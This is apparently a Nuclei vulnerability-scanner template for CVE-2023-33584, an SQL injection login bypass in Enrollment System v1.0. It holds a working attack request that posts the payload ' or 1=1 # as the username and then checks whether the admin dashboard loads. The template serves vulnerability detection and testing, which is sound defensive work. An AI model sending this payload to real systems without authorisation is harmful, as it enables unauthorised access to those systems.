id: CVE-2023-33584

info:
  name: Enrollment System Project v1.0 - SQL Injection Authentication Bypass
  author: r3Y3r53
  severity: critical
  description: |
    Enrollment System Project V1.0, developed by Sourcecodester, has been found to be vulnerable to SQL Injection (SQLI) attacks. This vulnerability allows an attacker to manipulate the SQL queries executed by the application. The system fails to properly validate user-supplied input in the username and password fields during the login process, enabling an attacker to inject malicious SQL code. By exploiting this vulnerability, an attacker can bypass authentication and gain unauthorized access to the system.
  reference:
    - https://www.exploit-db.com/exploits/51501
    - https://nvd.nist.gov/vuln/detail/CVE-2023-33584
    - https://packetstormsecurity.com/files/cve/CVE-2023-33584
    - https://www.sourcecodester.com/php/14444/enrollment-system-project-source-code-using-phpmysql.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-33584
    cwe-id: CWE-89
    epss-score: 0.05622
    epss-percentile: 0.92489
    cpe: cpe:2.3:a:enrollment_system_project:enrollment_system:1.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: enrollment_system_project
    product: enrollment_system
  tags: packetstorm,cve,cve2023,sqli,exploitdb,unauth,enrollment,enrollment_system_project

http:
  - raw:
      - |
        POST /enrollment/ajax.php?action=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username='+or+1%3D1+%23&password={{randstr}}
      - |
        GET /enrollment/index.php?page=home HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "Administrator") && contains(body_2, "Dashboard")'
          - 'contains(content_type, "text/html")'
          - 'status_code == 200'
        condition: and
# digest: 4a0a0047304502205184a47e55e6f9df947608cb1b8ea13f351d6f018643ac530839f51df80da266022100d2fc079fbe7104baf8e402d77f2bc0da88139b784315c6a855df45859a6cffe2:922c64590222798bb761d5b6d8e72950